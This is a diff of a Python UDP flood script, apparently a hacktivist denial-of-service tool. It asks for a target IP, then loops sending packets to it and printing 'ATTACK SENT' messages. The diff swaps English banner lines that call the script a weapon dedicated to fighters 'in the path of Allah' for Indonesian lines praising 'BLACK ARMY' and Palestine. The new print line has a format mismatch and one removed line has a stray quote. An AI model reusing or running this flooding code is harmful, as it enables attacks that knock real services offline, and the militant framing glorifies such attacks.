@@ -46,22 +46,18 @@ print("""
 \033[32m╚═══════════════════════════════════════════════════════════╝
 """)
 print("\033[33m┏━━━━━━━⬣")
-ip = input("\033[33m[+] Target's IP : ")
+ip = input("\033[33m┗━> Target's IP : ")
 time.sleep(5),
-print("\033[32m     Yaseen th")under \033[0m "),
+print("\033[32m    Ayu namaku\033[0m"),
 time.sleep(5),
-print("\033[33m     a weapon of mass destructions \033[0m "),
+print("\033[33m    BLACK ARMY tempat juangku\033[0m"),
 time.sleep(5),
-print("\033[32m     the most feared by the oppressors \033[0m "),
+print("\033[32m    PALESTINA saudaraku\033[0m"),
 time.sleep(5),
-print("\033[33m     a weapon dedicated to a fighter for the revival of Al-Aqsa \033[0m "),
+print("\033[33m    Kemerdekaan mutlak bagi mereka...\033[0m"),
 time.sleep(5),
-print("\033[32m     a father for all Palestinians \033[0m "),
+print("\033[32m.   adalah tujuanku...!\033[0m "),
 time.sleep(5),
-print("\033[33m     So.... This script is a small dedication to the struggle \033[0m "),
-time.sleep(5),
-print("\033[32m     in memory of the great warriors in the path of Allah \033[0m")
-time.sleep(5)
 print("\033[32m     ...\033[0m")
 time.sleep(5)
 while True:
@@ -70,7 +66,7 @@ while True:
         white.sendto(bytes, (ip, port))
         sent = sent + 1
         time.sleep(1)
-        print("\033[94m[AYU] \033[97m%s  \033[31m[ATTACK SENT]  \033[92m%s  \033[36mPort \033[33m%s " % (sent, ip, port))
+        print("\033[94m[AYU] \033[97m%s  \033[31m[ATTACK SENT]  \033[92m%s  \033[36mPort \033[33m80 " % (sent, ip, port))
     if():
         s.close
         print("\033[92mSerangan wes Rampung\033[0m")
